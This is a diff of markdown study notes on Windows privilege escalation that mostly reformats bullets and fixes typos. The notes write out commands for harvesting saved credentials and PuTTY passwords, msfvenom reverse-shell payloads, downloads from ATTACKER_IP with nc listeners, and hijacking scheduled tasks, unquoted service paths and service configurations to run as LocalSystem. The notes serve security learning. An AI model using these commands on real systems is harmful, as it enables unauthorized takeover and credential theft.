@@ -1373,17 +1373,17 @@ Without this, XSS and SQLi won’t fully click.
  
     	> type %userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
 
-	-> We could only run this command in cmd.exe as Powershell do not recognize the "%userprofile%" as an environment variable. So, in Powershell we could write "$Env:userprofile".
+	- We could only run this command in cmd.exe as Powershell do not recognize the "%userprofile%" as an environment variable. So, in Powershell we could write "$Env:userprofile".
 
 - Saved Windows Credentials:
 
   - Windows also allows us to use other users credentials.
  
-    	> cmdkey /list
+    		> cmdkey /list
 
-	-> It does not show the actual password, but if a user is within this suppose 'nischal', we can easily extract the password using:
+	- It does not show the actual password, but if a user is within this suppose 'nischal', we can easily extract the password using:
 
-		> runas /savecred /user:nischal cmd.exe
+			> runas /savecred /user:nischal cmd.exe
 
  ### IIS Configuration:
 
@@ -1405,7 +1405,7 @@ Without this, XSS and SQLi won’t fully click.
 
    		> reg query HKEY_CURRENT_USER\Software|SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 
-   -> Here, Simon Tatham is the creator of PuTTY and that is the name of the path not the username for which we would be retrieving password for.
+    - Here, Simon Tatham is the creator of PuTTY and that is the name of the path not the username for which we would be retrieving password for.
 
 ## Other Qucik Wins:
 
@@ -1417,23 +1417,23 @@ Without this, XSS and SQLi won’t fully click.
  
   - It can be listed using:
 
-		> schtasks /query /tn vulntask /fo list /v
+			> schtasks /query /tn vulntask /fo list /v
 
-	-> Looking at the information we will get here, we could easily identify the scheduled task by looking at the "Task to Run" parameter. Also, "Run As User" parameter could help us identify the user that will be used to execute the task. So, if our current user can modify this "Task to Run" executable, then we can control the script that will be executed by this user which results in a simple privilege escalation.
+	 - Looking at the information we will get here, we could easily identify the scheduled task by looking at the "Task to Run" parameter. Also, "Run As User" parameter could help us identify the user that will be used to execute the task. So, if our current user can modify this "Task to Run" executable, then we can control the script that will be executed by this user which results in a simple privilege escalation.
 
-	-> To check the file permission on the executable, we can use:
+	 - To check the file permission on the executable, we can use:
 
-		> icacls c:\tasks\schtask.bat
+			> icacls c:\tasks\schtask.bat
 
-	-> If the BUILTIN\Users group has full access (F) over this tasks binary, then we can modify the .bat file and insert any payload we want. After creating a payload we coud just do:
+	 - If the BUILTIN\Users group has full access (F) over this tasks binary, then we can modify the .bat file and insert any payload we want. After creating a payload we coud just use this command:
 
-		> echo c:\path\to\payload.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+			> echo c:\path\to\payload.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
 
-	-> We listen on our attacking machine
+	 - We listen on our attacking machine
 
-		> nc-lvnp 4444
+			> nc-lvnp 4444
 
-	-> So the next time the scheduled task runs, we will recieve the reverse shell with the user privilege that was supposed to run this task.
+	 - So the next time the scheduled task runs, we will recieve the reverse shell with the user privilege that was supposed to run this task.
 
 ### AlwaysInstallElevated:
 
@@ -1447,13 +1447,13 @@ Without this, XSS and SQLi won’t fully click.
 
   - Both should be set to exploit this vulnerability. Then, we can generate a malicious .msi file using msfvenom:
  
-    	> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+    		> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
 
-	-> We shoudl also run the Metasploit handler module by configuring it correctly and transfer this file to the Windows by hosting a python server then downloading it on windows system.
+	 - We shoudl also run the Metasploit handler module by configuring it correctly and transfer this file to the Windows by hosting a python server then downloading it on windows system.
 
-	-> to exploit it, we would run:
+	 - to exploit it, we would run:
 
-		> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+			> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 
 ## Abusing Service Misconfigurations
 
@@ -1463,7 +1463,9 @@ Without this, XSS and SQLi won’t fully click.
 
 - Structure of a service:
 
-  		> sc qc apphostsvc (checking the strucure of this service)
+  		> sc qc apphostsvc
+
+  (checking the strucure of this service)
 
   		SERVICE NAME : apphostsvc
 
@@ -1485,7 +1487,7 @@ Without this, XSS and SQLi won’t fully click.
 
   			SERVICE_START_NAME:
 
-  			{It is important to note to always check for binary path name and service start name to find any exploits realted to the service}
+  {It is important to note to always check for binary path name and service start name to find any exploits realted to the service}
 
   - Services have Discretionary Access Control list (DACL) that indicates who has permission to start, stop, pause, query status. query configuration, or reconfigure the service among other privileges. If a DACL is configured for the service, it will be stored in a subkey called Security and only administrators can modify such registry entries by default.
  
@@ -1493,45 +1495,45 @@ Without this, XSS and SQLi won’t fully click.
 
   - If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, then the attacker can gain the privileges of the service's account.
  
-    	> sc qc SERVICENAME
+    		> sc qc SERVICENAME
 
-	-> As I have mentioned above the key parameters to check for is the binary path name and service start name. If the service runs as a normal user other than the one we are logged in as, then it can be interesting to check the binary path permissions.
+	 - As I have mentioned above the key parameters to check for is the binary path name and service start name. If the service runs as a normal user other than the one we are logged in as, then it can be interesting to check the binary path permissions.
 
-		> icacls BINARY_PATH_NAME
+			> icacls BINARY_PATH_NAME
 
-	-> If we can spot anything like "Everyone:(I)(M), then it can be confirmed that the service is modifiable, and our current user can e. So, we can easily overwrite it with any payload of our preference, and the service will execute it with the privilege of the configured user account.
+	 - If we can spot anything like "Everyone:(I)(M), then it can be confirmed that the service is modifiable, and our current user can manipulate it. So, we can easily overwrite it with any payload of our preference, and the service will execute it with the privilege of the configured user account.
 
-	-> First, we need to generate a paylaod:
+	 - First, we need to generate a paylaod:
 
-		$ msfvenom -p windows/x64/shell_reverse_shell_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o svc.exe
+			$ msfvenom -p windows/x64/shell_reverse_shell_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o svc.exe
 
-	-> Then serve a server so that the windows unprivileged user can pull this file.
+	 - Then serve a server so that the windows unprivileged user can pull this file.
 
-		$ python3 -m http.server
+			$ python3 -m http.server
 
-	-> Pull the payload from the command line.
+	 - Pull the payload from the command line.
 
-		> curl http://ATTACKER_IP:8000/svc.exe -o svc.exe
+			> curl http://ATTACKER_IP:8000/svc.exe -o svc.exe
 
-	-> Once the payload is in the Windows server, we need to replace the existing vulnerable service executable with this payload.
+	 - Once the payload is in the Windows server, we need to replace the existing vulnerable service executable with this payload.
 
-		> cd PATH\TO\VULNERABLE_SERVICE
+			> cd PATH\TO\VULNERABLE_SERVICE
 
-		> move VulnerableService.exe VulnerableService.exe.bkp
+			> move VulnerableService.exe VulnerableService.exe.bkp
 
-	-> Then, we move our payload to this binary path where the service is executed
+	 - Then, we move our payload to this binary path where the service is executed
 
-		> move PATH\OF\LOWERPRIVUSER\svc.exe VulnerableService.exe
+			> move PATH\OF\LOWERPRIVUSER\svc.exe VulnerableService.exe
 
-	-> As, we need to execute our payload from another user, we will give full permission to the Everyone group as well.
+	 - As, we need to execute our payload from another user, we will give full permission to the Everyone group as well.
 
-		>icacls VulnerableService.exe /grant Everyone:F
+			>icacls VulnerableService.exe /grant Everyone:F
 
-	-> Then, we have to wait for the service to be restarted adn have a listener ready on the attack machine.
+	 - Then, we have to wait for the service to be restarted adn have a listener ready on the attack machine.
 
-		$ nc -lvnp 4444
+			$ nc -lvnp 4444
 
-	-> After this vulnerable service gets restarted, we will get a shell of the privileged configured user account on the attack machine.
+	 - After this vulnerable service gets restarted, we will get a shell of the privileged configured user account on the attack machine.
 
 ### Unquoted Service Paths:
 
@@ -1543,60 +1545,61 @@ Without this, XSS and SQLi won’t fully click.
 
   		> sc qc "SERVICENAME"
 
-  - We already know the structure these queires throw out so, here we adde the "" quote to the service name , so the paramter "BINARY_PATH_NAME" should show "PATH\TO\THE\SERVICE.exe". If the binary path does not has the "" quote, then, this means we can exploit this unquoted service path.
+- We already know the structure these queires throw out so, here we added the "" quote to the service name , so the paramter "BINARY_PATH_NAME" should show "PATH\TO\THE\SERVICE.exe". If the binary path does not has the "" quote, then, this means we can exploit this unquoted service path.
  
-  - This has to do with how the command prompt parses a command. Usually, when we send a command, spaces are used as argument seperators unless they are part of the quoted string. So, suppose if a service has binary path C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe without the quote, then, the SCM tries:
+- This has to do with how the command prompt parses a command. Usually, when we send a command, spaces are used as argument seperators unless they are part of the quoted string. So, suppose if a service has binary path C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe without the quote, then, the SCM tries:
  
-   		 -> First searches C:\\MyPrograms\\Disk.exe, if it runs the service will run this executable
+    - First searches C:\\MyPrograms\\Disk.exe, if it runs the service will run this executable
 
-		-> If it does not exist, it will search C:\\MyPrograms\\DiskSorter.exe.
+	- If it does not exist, it will search C:\\MyPrograms\\DiskSorter.exe.
 
-		-> If that also does not exist, then it will search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe.
+	- If that also does not exist, then it will search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe.
 
-	- So, the problem with this is if an attacker creates any of the executables that are searched for before the expected service executable, then they can force the service to run an arbitrary executable.
+- So, the problem with this is if an attacker creates any of the executables that are searched for before the expected service executable, then they can force the service to run an arbitrary executable.
  
-  - Most of service executables is installed under C:\Program Files or C:\Program Files (x86) by default, that cannot be writable by unprivileged users. But, some installers change the permissions on the installed folder making these services vulnerable. Even some adminsitrator might decide to install the service binaries in a non-default path. So, if such path is world-writable, the vulnerability can be exploited.
+- Most of service executables is installed under C:\Program Files or C:\Program Files (x86) by default, that cannot be writable by unprivileged users. But, some installers change the permissions on the installed folder making these services vulnerable. Even some adminsitrators might decide to install the service binaries in a non-default path. So, if such path is world-writable, the vulnerability can be exploited.
  
-  - Assuming the example provided above of the binary path, We can check this using :
+- Assuming the example provided above of the binary path, We can check this using :
  
     	> icacls c:\MyPrograms
 
-	-> We could look for BUILTIN\USERS group, where the permissions are written for all users of the Windows system. If we can see (AD) and (WD) privileges, this means the user can create subdirectories and files in this location. So, an attacker can create an exe-service payload in this path so that the SCM tries the attackers payload executable before teaching the real service executable. The above method could be used to generate and serve the payload in the windows server.
+	- We could look for BUILTIN\USERS group, where the permissions are written for all users of the Windows system. If we can see (AD) and (WD) privileges, this means the user can create subdirectories and files in this location. So, an attacker can create an exe-service payload in this path so that the SCM tries the attackers payload executable before teaching the real service executable. The above method could be used to generate and serve the payload in the windows server.
 
-		$ msfvenom -l <Payload> <Options>
+			$ msfvenom -l <Payload> <Options>
 
-		$ python -m http.server
+			$ python -m http.server
 
 		On windows:
 
-		> curl http://ATTACKER_IP:8000/svc.exe -o svc.exe
+			> curl http://ATTACKER_IP:8000/svc.exe -o svc.exe
 
-	-> Then, we can move this executable to the path of the binary which the SCM will reach first than the actual one.
+	- Then, we can move this executable to the path of the binary which the SCM will reach first than the actual one.
 
-		> move C:\Users\target\svc.exe C:\MyPrograms\Disk.exe
+			> move C:\Users\target\svc.exe C:\MyPrograms\Disk.exe
 
-	-> Grant Everyone full permission so it can be executed by service
+	- Grant Everyone full permission so it can be executed by service
 
-		> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+			> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
 
-	 -> Then, we can restart the service or wait for it to be restarted.
+	 - Then, we can restart the service or wait for it to be restarted.
  
   		In Attacking Machine:
  
-    	$ nc -lvnp 4444 (should be the port that is configured in the payload)
+    		$ nc -lvnp 4444 (should be the port that is configured in the payload)
  
     	In Windows:
 
-		> sc stop "disk sorter enterprise"
+			> sc stop "disk sorter enterprise"
 
-		> sc start "disk sorter enterprise"
+			> sc start "disk sorter enterprise"
 
 	- As a result, we will get a reverse shell on the attacking machine of the privileged configured user that could give attacker more freedom inside the system
  
  ### Insecure Service Permissions:
 
  - We still have a slight chance of taking advantage of a service if the service's executable DACL is well configured and the service binary path is rightly quoted. We can check if the service DACL can allow us to modify the configuration of a service (not the service's executable DACL), then we could reconfigure the service. What this does is, it allows us to point to any executable we needs and run it with any account, including SYSTEM itself.
- - To cehck for a service DACL, we could use Accesschk from the Sysinternals suite.
+   
+ - To check for a service DACL, we could use Accesschk from the Sysinternals suite.
 
    		> accesschk.exe -qlc SERVICE_NAME
 
@@ -1612,19 +1615,19 @@ Without this, XSS and SQLi won’t fully click.
   
      		> sc config SERVICE_NAME binPath="C:\PATH\TO\PAYLOAD\svc.exe" obj= LocalSystem
 
-	 -> As we could use any account to run the service, here we chose LocalSystem because it is the highest privilege account available. Now to trigger our payload we need to restart the service, but before we should have a listener ready to gain a reverse shell on the attacking machine.
+	- As we could use any account to run the service, here we chose LocalSystem because it is the highest privilege account available. Now to trigger our payload we need to restart the service, but before we should have a listener ready to gain a reverse shell on the attacking machine.
 
-	 		On Attacking Machine
+	 	On Attacking Machine
 
 			$ nc -lvnp 4444
 
-			On Windows Machine
+		On Windows Machine
 
 			> sc stop SERICE_NAME
 
 	 		> sc start SERVICE_NAME
 
-	 -> When we will look at our machine we will be at the highest privilege account of the Windows machine.
+	 - When we will look at our machine we will be at the highest privilege account of the Windows machine.
 
 ## Abusing Dangerous Privileges:
 
